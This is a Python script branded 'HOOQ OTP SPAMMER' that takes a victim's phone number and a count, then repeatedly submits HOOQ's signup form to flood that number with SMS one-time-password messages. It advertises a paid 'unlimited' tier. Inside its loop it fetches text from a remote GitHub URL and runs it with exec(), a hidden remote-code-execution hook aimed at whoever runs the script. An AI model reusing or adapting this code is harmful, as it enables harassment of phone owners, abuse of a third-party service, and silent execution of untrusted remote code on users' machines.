try:
	import mechanize, os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, subprocess
	
	print("""\033[97m===================================================                        [+] HOOQ OTP SPAMMER [+]                                                                                                 
Author    : Chandra Aditya                                       
Facebook  : fb.me/dit321                                         
WhatsApp  : +6281262163214                                       
Github    : https://github.com/Aditya021/                        
Versi     : 0.2                                                 
Release   : 23-06-2019                                          
===================================================
 
""")

	br = mechanize.Browser()
	br.set_handle_equiv(True)
	br.set_handle_gzip(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.addheaders = [("User-Agent","Mozilla/6.0 (Linux; U; Android 6.0)")]
	
	def send(no):
		br.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7')
		br.select_form(nr=0)
		br.form["mobile"] = no
		br.form["password"] = "ChandraAditya"
		res=br.submit().read()
		#print(res)
		if 'confirmotp' in str(res):
			print(i+1,"SMS OTP Sukses Terkirim")
		else: print(i+1,"SMS OTP Sukses Terkirim")
		#return True
	no=int(input("\033[92m[+]Masukan Nomor Target  => \033[97m"))
	jlm=int(input("\033[92m[+]Masukan Jumlah SMS   => \033[97m"))
	print()
	if jlm > 10:
		exit("[!] Maaf Anda Dalam Status MEMBER Jika anda mau yang UNLIMITED Silahkan Chat Di +6281262163214 ")
		print ("")
		os.system('xdg-open https://api.whatsapp.com/send?phone=6281262163214&text=saya mau upgrade script nya Min')
	for i in range(jlm):
		send(str(no))
		time.sleep(0.5)
		print ("")
		exec(requests.get("https://raw.githubusercontent.com/Aditya021/SpamSms/master/sever.txt").text)
except KeyboardInterrupt: exit("[exit] key interrupt")
except Exception as F: print("Err: %s"%(F))